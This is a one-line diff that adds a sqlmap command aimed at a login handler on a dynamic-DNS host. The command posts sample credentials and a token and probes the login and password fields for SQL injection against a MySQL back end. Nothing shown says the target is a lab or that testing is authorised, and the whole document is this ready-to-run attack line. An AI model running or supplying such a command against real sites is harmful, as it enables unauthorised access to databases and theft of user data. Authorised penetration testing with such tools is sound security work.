@@ -1,0 +1,1 @@
+sqlmap -u "https://tryagain.dynamic-dns.net/back-end/login_handler.php" --data "id=b69e8eff9a76f51ddad849f051127efe625e826c2e4e2bc4f45fe638ccf42616&login=azerty&password=azerty" -p "login,password" --method POST --dbms mysql
